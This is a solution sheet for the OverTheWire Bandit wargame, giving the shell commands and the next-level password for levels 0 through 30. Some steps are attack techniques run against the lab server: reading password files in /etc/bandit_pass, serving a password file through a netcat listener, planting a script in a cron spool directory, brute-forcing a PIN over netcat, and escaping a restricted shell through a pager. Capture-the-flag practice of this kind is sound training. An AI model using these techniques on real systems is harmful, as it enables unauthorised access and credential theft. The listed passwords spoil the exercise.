ssh bandit0@bandit.labs.overthewire.org -p 2220

username:	bandit0
pass:	bandit0
cat readme

username:	bandit1
pass:	ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
cat ./-

username:	bandit2
pass:	263JGJPfgU6LtdEvgfWU1XP5yac29mFx
cat "spaces in this filename"

username:	bandit3
pass:	MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
cd inhere
ls -a (all) -l(long list) -h(human readable format)
cat .hidden

username:	bandit4
pass:	2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
cd inhere
file ./*
cat ./-file07

username:	bandit5
pass:	4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
find . -type f -readable -size 1033c ! -executable
cat ./maybehere07/.file2

username:	bandit6
pass:	HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
cat /var/lib/dpkg/info/bandit7.password

username:	bandit7
pass:	morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
grep "millionth" data.txt

username:	bandit8
pass:	dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
sort data.txt | uniq -u

username:	bandit9
pass:	4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
strings data.txt | grep "==="

username:	bandit10
pass:	FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
base64 -d data.txt

username:	bandit11
pass:	dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

username:	bandit12
pass:	7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
mkdir /tmp/mydir
cp data.txt /tmp/mydir
cd /tmp/mydir
xxd -r data.txt > data.bin
file data.bin
mv data.bin data.gz
gzip -d data.gz

username:	bandit13
pass:	FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
ssh -i sshkey.private bandit14@localhost -p 2220
cat /etc/bandit_pass/bandit14

username:	bandit14
pass:	MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
echo "MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS" | nc localhost 30000

username:	bandit15
pass:	8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
openssl s_client -connect localhost:30001
(enter 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo)

username:	bandit16
pass:	kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
nmap -p 31000-32000 localhost
openssl s_client -connect localhost:31790
(enter kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx, save RSA key locally)
chmod 600 key.private
ssh -i key.private bandit17@localhost -p 2220

username:	bandit17
pass:	EReVavePLFHtFlFsjn3hyzMlvSuSAcRD
diff passwords.old passwords.new

username:	bandit18
pass:	x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
ssh bandit18@localhost -p 2220 'cat readme'

username:	bandit19
pass:	cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
./bandit20-do cat /etc/bandit_pass/bandit20

username:	bandit20
pass:	0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
nc -l -p 4444 < /etc/bandit_pass/bandit20 &
./suconnect 4444

username:	bandit21
pass:	EeoULMCra2q0dSkYj561DX7s1CpBuOBt
cat /etc/crontab
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7go3

username:	bandit22
pass:	tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
cat /etc/crontab
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
cat /tmp/8ca319486bfbbc3663ea0fbe81326349

username:	bandit23
pass:	0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/mydir
cd /tmp/mydir
echo "cat /etc/bandit_pass/bandit24 > /tmp/mydir/pass" > script.sh
chmod +x script.sh
cp script.sh /var/spool/bandit24/foo
cat pass

username:	bandit24
pass:	gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
mkdir /tmp/mydir
cd /tmp/mydir
nano script.sh 
(for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002 > result.txt)
chmod +x script.sh
./script.sh
cat result.txt | grep -v "Wrong"

username:	bandit25
pass:	iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
ssh -i bandit26.sshkey bandit26@localhost -p 2220
(shrink terminal to be very small to trigger 'more' pager)
v
:set shell=/bin/bash
:shell

username:	bandit26
pass:	s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
./bandit27-do cat /etc/bandit_pass/bandit27

username:	bandit27
pass:	upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
mkdir /tmp/mydir
cd /tmp/mydir
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
cat repo/README

username:	bandit28
pass:	Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
mkdir /tmp/mydir
cd /tmp/mydir
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
cd repo
git log -p

username:	bandit29
pass:	4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
mkdir /tmp/mydir
cd /tmp/mydir
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
cd repo
git branch -a
git checkout dev
cat README.md

username:	bandit30
pass:	qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
mkdir /tmp/mydir
cd /tmp/mydir
git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
cd repo
git tag
git show secret
